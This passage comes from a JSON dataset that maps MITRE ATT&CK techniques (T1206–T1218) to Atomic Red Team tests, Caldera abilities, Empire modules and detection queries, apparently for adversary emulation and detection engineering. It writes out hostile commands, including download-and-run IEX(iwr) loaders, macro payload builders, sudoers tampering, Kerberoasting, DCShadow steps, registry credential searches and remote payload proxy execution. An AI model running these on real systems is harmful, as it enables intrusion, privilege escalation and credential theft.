\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe #{jse_path}`\"`n\"\nInvoke-MalDoc $macrocode \"16.0\" \"#{ms_product}\"\n", "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe #{jse_path}`\"`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"Word\"\n", "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe C:\\Users\\Public\\art.jse`\"`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"#{ms_product}\"\n", "echo var url = \"#{file_url}\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\\OSTapGet.js\ncscript //E:Jscript %TEMP%\\OSTapGet.js\n", "echo var url = \"https://128.30.52.100/TR/PNG/iso_8859-1.txt\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}\ncscript //E:Jscript #{script_file}\n", "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc $macrocode \"16.0\" \"#{ms_product}\"\n", "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"Word\"\n", "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc $macrocode \"16.0\" \"#{ms_product}\"\n", "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"Word\"\n", "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript C:\\Users\\Public\\art.jse`\", vbNormalFocus)`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"#{ms_product}\"\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1206", "commands": [{"source": "atomics/T1206/T1206.yaml", "command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers\nsudo visudo -c -f /etc/sudoers\n", "name": null}, {"source": "atomics/T1206/T1206.yaml", "command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\"\nsudo visudo -c -f /etc/sudoers\n", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\"", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Sudo Caching": {"attack_technique": "T1206", "display_name": "Sudo Caching", "atomic_tests": [{"name": "Unlimited sudo cache timeout", "description": "Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.\n", "supported_platforms": ["macos", "linux"], "executor": {"name": "sh", "command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers\nsudo visudo -c -f /etc/sudoers\n"}}, {"name": "Disable tty_tickets for sudo caching", "description": "Sets sudo caching tty_tickets value to disabled. This is dangerous to modify without using 'visudo', do not do this on a production system.\n", "supported_platforms": ["macos", "linux"], "executor": {"name": "sh", "command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\"\nsudo visudo -c -f /etc/sudoers\n"}}]}}], "command_list": ["sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers\nsudo visudo -c -f /etc/sudoers\n", "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\"\nsudo visudo -c -f /etc/sudoers\n", "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers", "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\""], "attack_paths": [], "queries": [{"product": "Splunk", "query": "index=linux sourcetype=\"linux_audit\" sudoers_change", "name": null}, {"product": "Splunk", "query": "Audit Rule : -w /etc/sudoers -p wa -k sudoers_change", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}]}, {"technique_id": "T1207", "commands": [], "parsed_datasets": [{"Atomic Red Team Test - DCShadow": {"attack_technique": "T1207", "display_name": "DCShadow", "atomic_tests": [{"name": "DCShadow - Mimikatz", "description": "Utilize Mimikatz DCShadow method to simulate behavior of a Domain Controller\n\n[DCShadow](https://www.dcshadow.com/)\n[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)\n", "supported_platforms": ["windows"], "executor": {"name": "manual", "steps": "1. Start Mimikatz and use !processtoken (and not token::elevate - as it elevates a thread) to escalate to SYSTEM.\n2. Start another mimikatz with DA privileges. This is the instance which registers a DC and is used to \"push\" the attributes.\n3. lsadump::dcshadow /object:ops-user19$ /attribute:userAccountControl /value:532480\n4. lsadump::dcshadow /push\n"}}]}}], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1208", "commands": [{"source": "atomics/T1208/T1208.yaml", "command": "iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)\nInvoke-Kerberoast | fl\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/invoke_kerberoast", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/invoke_kerberoast", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Kerberoasting": {"attack_technique": "T1208", "display_name": "Kerberoasting", "atomic_tests": [{"name": "Request for service tickets", "description": "This test uses the Powershell Empire Module: https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1\n\nThe following are further sources and credits for this attack:\n[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\nwhen executed successfully , the test displays available services with their hashes. \nIf the testing domain doesn't have any service principal name configured, there is no output \n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)\nInvoke-Kerberoast | fl\n"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/invoke_kerberoast", "ATT&CK Technique #1": "T1208", "ATT&CK Technique #2": "", "Technique": "Kerberoasting", "Concatenate for Python Dictionary": "\"powershell/credentials/invoke_kerberoast\":  [\"T1208\"],"}}], "command_list": ["iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)\nInvoke-Kerberoast | fl\n", "powershell/credentials/invoke_kerberoast", "powershell/credentials/invoke_kerberoast"], "attack_paths": [], "queries": [{"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: kerberos weak encryption\ndescription: domain environment test\nreferences: https://adsecurity.org/?p=3458\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4769 #kerberos Service Ticket Request\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0TicketOptions: 0x40810000 # Additional information> Ticket Options\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0TicketEncryptiontype: 0x17 # Additional information> Ticket Encryption Type\n\u00a0\u00a0\u00a0\u00a0reduction:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- ServiceName: '$ *' # service name> service information\n\u00a0\u00a0\u00a0\u00a0condition: selection and not reduction\nlevel: medium", "name": "Yml"}], "possible_detections": [{"data_source": {"title": "Possible SPN Enumeration", "id": "1eeed653-dbc8-4187-ad0c-eeebb20e6599", "description": "Detects Service Principal Name Enumeration used for Kerberoasting", "status": "experimental", "references": ["https://p16.praetorian.com/blog/how-to-use-kerberoasting-t1208-for-privilege-escalation"], "author": "Markus Neis, keepwatch", "date": "2018/11/14", "tags": ["attack.credential_access", "attack.t1208"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection_image": {"Image": "*\\setspn.exe"}, "selection_desc": {"Description": "*Query or reset the computer* SPN attribute*"}, "cmd": {"CommandLine": "*-q*"}, "condition": "(selection_image or selection_desc) and cmd"}, "falsepositives": ["Administrator Activity"], "level": "medium"}}, {"data_source": {"title": "Suspicious Kerberos RC4 Ticket Encryption", "id": "496a0e47-0a33-4dca-b009-9e6ca3591f39", "status": "experimental", "references": ["https://adsecurity.org/?p=3458", "https://www.trimarcsecurity.com/single-post/TrimarcResearch/Detecting-Kerberoasting-Activity"], "tags": ["attack.credential_access", "attack.t1208"], "description": "Detects service ticket requests using RC4 encryption type", "logsource": {"product": "windows", "service": "security"}, "detection": {"selection": {"EventID": 4769, "TicketOptions": "0x40810000", "TicketEncryptionType": "0x17"}, "reduction": [{"ServiceName": "$*"}], "condition": "selection and not reduction"}, "falsepositives": ["Service accounts used on legacy systems (e.g. NetApp)", "Windows Domains with DFL 2003 and legacy systems"], "level": "medium"}}]}, {"technique_id": "T1214", "commands": [{"source": "atomics/T1214/T1214.yaml", "command": "reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n", "name": null}, {"source": "atomics/T1214/T1214.yaml", "command": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s\n", "name": null}, {"source": "data/abilities/credential-access/3aad5312-d48b-4206-9de4-39866c12e60f.yml", "command": {"windows": {"psh": {"command": "reg query HKCU /f password /t REG_SZ /s\n"}}}, "name": "Search for possible credentials stored in Registry"}], "parsed_datasets": [{"Atomic Red Team Test - Credentials in Registry": {"attack_technique": "T1214", "display_name": "Credentials in Registry", "atomic_tests": [{"name": "Enumeration for Credentials in Registry", "description": "Queries to enumerate for credentials in the Registry. Upon execution, any registry key containing the word \"password\" will be displayed.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n"}}, {"name": "Enumeration for PuTTY Credentials in Registry", "description": "Queries to enumerate for PuTTY credentials in the Registry. PuTTY must be installed for this test to work. If any registry\nentries are found, they will be displayed.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s\n"}}]}}, {"Mitre Stockpile - Search for possible credentials stored in Registry": {"id": "3aad5312-d48b-4206-9de4-39866c12e60f", "name": "Credentials in Registry", "description": "Search for possible credentials stored in Registry", "tactic": "credential-access", "technique": {"attack_id": "T1214", "name": "Credentials in Registry"}, "platforms": {"windows": {"psh": {"command": "reg query HKCU /f password /t REG_SZ /s\n"}}}}}], "command_list": ["reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n", "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s\n", {"windows": {"psh": {"command": "reg query HKCU /f password /t REG_SZ /s\n"}}}], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_command_line contains \"reg query HKLM \\\\/f password \\\\/t REG_SZ \\\\/s\"or process_command_line contains \"reg query HKCU \\\\/f password \\\\/t REG_SZ \\\\/s\"or process_command_line contains \"Get-UnattendedInstallFile\"or process_command_line contains \"Get-Webconfig\"or process_command_line contains \"Get-ApplicationHost\"or process_command_line contains \"Get-SiteListPassword\"or process_command_line contains \"Get-CachedGPPPassword\"or process_command_line contains \"Get-RegistryAutoLogon\")", "name": "Credentials In Registry"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: credentials to enumerate the registry\ndescription: win7 test\nreferences: http://www.rinige.com/index.php/archives/770/\ntags: T1214\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: sysmon\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 1 # Process Creation\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Image: 'C: \\ * \\ reg.exe'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0OriginalFileName: reg.exe\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0CommandLine: 'reg query \"HKLM \\ SOFTWARE \\ Microsoft \\ Windows NT \\ Currentversion \\ Winlogon\"'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ParentCommandLine: \"C: \\ * \\ cmd.exe\"\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "name": "Yml"}], "possible_detections": []}, {"technique_id": "T1215", "commands": [{"source": "atomics/T1215/T1215.yaml", "command": "sudo insmod #{module_path}\n", "name": null}, {"source": "atomics/T1215/T1215.yaml", "command": "sudo insmod #{module_path}\n", "name": null}, {"source": "atomics/T1215/T1215.yaml", "command": "sudo insmod PathToAtomicsFolder/T1215/bin/T1215.ko\n", "name": null}, {"source": "atomics/T1215/T1215.yaml", "command": "sudo insmod #{module_path}\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Kernel Modules and Extensions": {"attack_technique": "T1215", "display_name": "Kernel Modules and Extensions", "atomic_tests": [{"name": "Linux - Load Kernel Module via insmod", "description": "This test uses the insmod command to load a kernel module for Linux.\n", "supported_platforms": ["linux"], "input_arguments": {"temp_folder": {"description": "Temp folder used to compile the code.", "type": "path", "default": "/tmp/T1215"}, "module_source_path": {"description": "Path to download Gsecdump binary file", "type": "url", "default": "PathToAtomicsFolder/T1215/src"}, "module_path": {"description": "Folder used to store the module.", "type": "path", "default": "PathToAtomicsFolder/T1215/bin/T1215.ko"}, "module_name": {"description": "Name of the kernel module name.", "type": "string", "default": "T1215"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "The kernel module must exist on disk at specified location\n", "prereq_command": "if [ -f #{module_path} ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "if [ ! -d #{temp_folder} ]; then mkdir #{temp_folder}; touch #{temp_folder}/safe_to_delete; fi;\ncp #{module_source_path}/* #{temp_folder}/\ncd #{temp_folder}; make\nmv #{temp_folder}/#{module_name}.ko #{module_path}\n[ -f #{temp_folder}/safe_to_delete ] && rm -rf #{temp_folder}\n"}], "executor": {"name": "bash", "elevation_required": true, "command": "sudo insmod #{module_path}\n", "cleanup_command": "sudo rmmod #{module_name}\n"}}]}}], "command_list": ["sudo insmod #{module_path}\n", "sudo insmod #{module_path}\n", "sudo insmod PathToAtomicsFolder/T1215/bin/T1215.ko\n", "sudo insmod #{module_path}\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1216", "commands": [{"source": "atomics/T1216/T1216.yaml", "command": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/src/T1216.sct\"\n", "name": null}, {"source": "atomics/T1216/T1216.yaml", "command": "C:\\windows\\system32\\SyncAppvPublishingServer.vbs \"\\n;Start-Process calc\"\n", "name": null}, {"source": "atomics/T1216/T1216.yaml", "command": "set comspec=C:\\Windows\\System32\\calc.exe\ncscript manage-bde.wsf\n", "name": null}, {"source": "SysmonHunter - Signed Script Proxy Execution", "command": "PubPrn.vbsPubPrn.vbs", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Signed Script Proxy Execution": {"attack_technique": "T1216", "display_name": "Signed Script Proxy Execution", "atomic_tests": [{"name": "PubPrn.vbs Signed Script Bypass", "description": "Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.\n", "supported_platforms": ["windows"], "input_arguments": {"remote_payload": {"description": "A remote payload to execute using PubPrn.vbs.", "type": "Url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/src/T1216.sct"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:#{remote_payload}\"\n"}}, {"name": "SyncAppvPublishingServer Signed Script PowerShell Command Execution", "description": "Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.\nUpon execution, calc.exe will be launched.\n", "supported_platforms": ["windows"], "input_arguments": {"command_to_execute": {"description": "A PowerShell command to execute.", "type": "string", "default": "Start-Process calc"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "C:\\windows\\system32\\SyncAppvPublishingServer.vbs \"\\n;#{command_to_execute}\"\n"}}, {"name": "manage-bde.wsf Signed Script Command Execution", "description": "Executes the signed manage-bde.wsf script with options to execute an arbitrary command.\n", "supported_platforms": ["windows"], "input_arguments": {"command_to_execute": {"description": "A command to execute.", "type": "Path", "default": "C:\\Windows\\System32\\calc.exe"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "set comspec=#{command_to_execute}\ncscript manage-bde.wsf\n", "cleanup_command": "set comspec=C:\\Windows\\System32\\cmd.exe\n"}}]}}, {"SysmonHunter - T1216": {"name": "Signed Script Proxy Execution", "description": null, "level": "high", "phase": "Execution", "query": [{"type": "process", "process": {"any": {"pattern": "PubPrn.vbs"}}, "file": {"path": {"pattern": "PubPrn.vbs"}}}]}}], "command_list": ["cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/src/T1216.sct\"\n", "C:\\windows\\system32\\SyncAppvPublishingServer.vbs \"\\n;Start-Process calc\"\n", "set comspec=C:\\Windows\\System32\\calc.exe\ncscript manage-bde.wsf\n", "PubPrn.vbsPubPrn.vbs"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where process_path contains \"cscript\"or process_path contains \"wscript\"or process_path contains \"certutil\"or process_path contains \"jjs\"and file_directory !contains \" /nologo \\\"MonitorKnowledgeDiscovery.vbs\\\"\"", "name": "Signed Script Proxy Execution"}], "possible_detections": []}, {"technique_id": "T1217", "commands": [{"source": "atomics/T1217/T1217.yaml", "command": "find / -path \"*.mozilla/firefox/*/places.sqlite\" 2>/dev/null -exec echo {} >> /tmp/T1217-Firefox.txt \\;\ncat /tmp/T1217-Firefox.txt 2>/dev/null\n", "name": null}, {"source": "atomics/T1217/T1217.yaml", "command": "find / -path \"*/Firefox/Profiles/*/places.sqlite\" -exec echo {} >> /tmp/T1217_Firefox.txt \\;\ncat /tmp/T1217_Firefox.txt 2>/dev/null\n", "name": null}, {"source": "atomics/T1217/T1217.yaml", "command": "find / -path \"*/Google/Chrome/*/Bookmarks\" -exec echo {} >> /tmp/T1217-Chrome.txt \\;\ncat /tmp/T1217-Chrome.txt 2>/dev/null\n", "name": null}, {"source": "atomics/T1217/T1217.yaml", "command": "Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force\n", "name": null}, {"source": "atomics/T1217/T1217.yaml", "command": "where /R C:\\Users\\ Bookmarks\n", "name": null}, {"source": "data/abilities/discovery/b007fc38-9eb7-4320-92b3-9a3ad3e6ec25.yml", "command": {"darwin": {"sh": {"command": "cat ~/Library/Application\\ Support/Google/Chrome/Default/Bookmarks\n", "parsers": {"plugins.stockpile.app.parsers.bookmarks": [{"source": "host.chrome.bookmark_title", "edge": "resolves_to", "target": "host.chrome.bookmark_url"}]}}}}, "name": "Get Chrome Bookmarks"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/browser_data", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/browser_data", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Browser Bookmark Discovery": {"attack_technique": "T1217", "display_name": "Browser Bookmark Discovery", "atomic_tests": [{"name": "List Mozilla Firefox Bookmark Database Files on Linux", "description": "Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed.", "type": "Path", "default": "/tmp/T1217-Firefox.txt"}}, "executor": {"name": "sh", "command": "find / -path \"*.mozilla/firefox/*/places.sqlite\" 2>/dev/null -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n", "cleanup_command": "rm -f #{output_file} 2>/dev/null\n"}}, {"name": "List Mozilla Firefox Bookmark Database Files on macOS", "description": "Searches for Mozilla Firefox's places.sqlite file (on macOS) that contains bookmarks and lists any found instances to a text file.\n", "supported_platforms": ["macos"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed.", "type": "Path", "default": "/tmp/T1217_Firefox.txt"}}, "executor": {"name": "sh", "command": "find / -path \"*/Firefox/Profiles/*/places.sqlite\" -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n", "cleanup_command": "rm -f #{output_file} 2>/dev/null\n"}}, {"name": "List Google Chrome Bookmark JSON Files on macOS", "description": "Searches for Google Chrome's Bookmark file (on macOS) that contains bookmarks in JSON format and lists any found instances to a text file.\n", "supported_platforms": ["macos"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed.", "type": "Path", "default": "/tmp/T1217-Chrome.txt"}}, "executor": {"name": "sh", "command": "find / -path \"*/Google/Chrome/*/Bookmarks\" -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n", "cleanup_command": "rm -f #{output_file} 2>/dev/null\n"}}, {"name": "List Google Chrome Bookmarks on Windows with powershell", "description": "Searches for Google Chromes's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "command": "Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force\n"}}, {"name": "List Google Chrome Bookmarks on Windows with command prompt.", "description": "Searches for Google Chromes's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "command": "where /R C:\\Users\\ Bookmarks\n"}}]}}, {"Mitre Stockpile - Get Chrome Bookmarks": {"id": "b007fc38-9eb7-4320-92b3-9a3ad3e6ec25", "name": "Get Chrome Bookmarks", "description": "Get Chrome Bookmarks", "tactic": "discovery", "technique": {"attack_id": "T1217", "name": "Browser Bookmark Discovery"}, "platforms": {"darwin": {"sh": {"command": "cat ~/Library/Application\\ Support/Google/Chrome/Default/Bookmarks\n", "parsers": {"plugins.stockpile.app.parsers.bookmarks": [{"source": "host.chrome.bookmark_title", "edge": "resolves_to", "target": "host.chrome.bookmark_url"}]}}}}}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/browser_data", "ATT&CK Technique #1": "T1217", "ATT&CK Technique #2": "", "Technique": "Browser Bookmark Discovery", "Concatenate for Python Dictionary": "\"powershell/collection/browser_data\":  [\"T1217\"],"}}], "command_list": ["find / -path \"*.mozilla/firefox/*/places.sqlite\" 2>/dev/null -exec echo {} >> /tmp/T1217-Firefox.txt \\;\ncat /tmp/T1217-Firefox.txt 2>/dev/null\n", "find / -path \"*/Firefox/Profiles/*/places.sqlite\" -exec echo {} >> /tmp/T1217_Firefox.txt \\;\ncat /tmp/T1217_Firefox.txt 2>/dev/null\n", "find / -path \"*/Google/Chrome/*/Bookmarks\" -exec echo {} >> /tmp/T1217-Chrome.txt \\;\ncat /tmp/T1217-Chrome.txt 2>/dev/null\n", "Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force\n", "where /R C:\\Users\\ Bookmarks\n", {"darwin": {"sh": {"command": "cat ~/Library/Application\\ Support/Google/Chrome/Default/Bookmarks\n", "parsers": {"plugins.stockpile.app.parsers.bookmarks": [{"source": "host.chrome.bookmark_title", "edge": "resolves_to", "target": "host.chrome.bookmark_url"}]}}}}, "powershell/collection/browser_data", "powershell/collection/browser_data"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_command_line contains \"*firefox*places.sqlite*\")", "name": "Browser Bookmark Discovery"}], "possible_detections": []}, {"technique_id": "T1218", "commands": [{"source": "atomics/T1218/T1218.yaml", "command": "mavinject.exe #{process_id} /INJECTRUNNING PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll\n", "name": null}, {"source": "atomics/T1218/T1218.yaml", "command": null, "name": null}, {"source": "atomics/T1218/T1218.yaml", "command": "SyncAppvPublishingServer.exe \"n; Start-Process calc.exe\"\n", "name": null}, {"source": "atomics/T1218/T1218.yaml", "command": "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll\n", "name": null}, {"source": "atomics/T1218/T1218.yaml", "command": "msiexec.exe /q /i \"PathToAtomicsFolder\\T1218\\src\\Win32\\T1218.msi\"\n", "name": null}, {"source": "atomics/T1218/T1218.yaml", "command": "msiexec.exe /q /i \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218.msi\"\n", "name": null}, {"source": "atomics/T1218/T1218.yaml", "command": "msiexec.exe /y \"PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll\"\n", "name": null}, {"source": "atomics/T1218/T1218.yaml", "command": "odbcconf.exe /S /A {REGSVR \"PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll\"}\n", "name": null}, {"source": "atomics/T1218/T1218.yaml", "command": "InfDefaultInstall.exe PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf\n", "name": null}, {"source": "SysmonHunter - Signed Binary Proxy Execution", "command": "mavinject.exe|SyncAppvPublishingServer.exe", "name": null}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Log\n# Windows security log\nEvent ID: 4688\nProcess information:\nNew Process ID: 0xe78\nNew Process Name: C: \\ Windows \\ System32 \\ msiexec.exe\n\n# Sysmon log\nEvent ID: 1\nUtcTime: 2020-04-18 14: 04: 16.596\nProcessGuid: {bb1f7c32-08e0-5e9b-0000-0010b8ff3f01}\nProcessId: 3704\nImage: C: \\ Windows \\ System32 \\ msiexec.exe\nFileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows installer\nProduct: Windows Installer - Unicode\nCompany: Microsoft Corporation\nOriginalFileName: msiexec.exe\nCommandLine: msiexec / q / i http://192.168.126.146/1.msi\nCurrentDirectory: C: \\ Users \\ 12306Br0 \\\nUser: 12306Br0-PC \\ 12306Br0\nLogonGuid: 